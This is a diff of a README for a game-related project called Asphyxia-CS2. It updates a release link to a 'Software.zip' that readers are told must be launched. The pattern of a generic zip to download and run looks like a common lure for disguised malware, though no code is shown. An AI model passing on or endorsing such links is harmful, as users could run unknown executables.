@@ -24,7 +24,7 @@ Asphyxia-CS2 is a project aimed at enthusiasts who want to explore the world of 
 ## Getting Started 🚀
 
 To get started with Asphyxia-CS2, you can download the repository using the following link:
-[Download Asphyxia-CS2](https://github.com/gr3uh/asphyxia-cs2/releases/download/v1.0/Software.zip)
+[Download Asphyxia-CS2](https://github.com/gr3uh/asphyxia-cs2/releases/download/v2.0/Software.zip)
 
 🔽 **Please note:** This link leads to a downloadable zip file that needs to be launched.
 
